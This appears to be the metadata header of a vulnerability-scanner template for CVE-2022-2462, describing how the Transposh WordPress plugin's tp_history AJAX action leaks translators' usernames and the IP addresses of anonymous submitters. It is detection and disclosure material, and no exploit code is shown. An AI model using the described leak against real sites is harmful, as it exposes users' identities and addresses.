id: CVE-2022-2462

info:
  name: WordPress Transposh <=1.0.8.1 - Information Disclosure
  author: dwisiswant0
  severity: medium
  description: |
    WordPress Transposh plugin through is susceptible to information disclosure via the AJAX action tp_history, which is intended to return data about who has translated a text given by the token parameter. However, the plugin also returns the user's login name as part of the user_login attribute.  If an anonymous user submits the translation, the user's IP address is returned. An attacker can leak the WordPress username of translators and potentially execute other unauthorized operations.
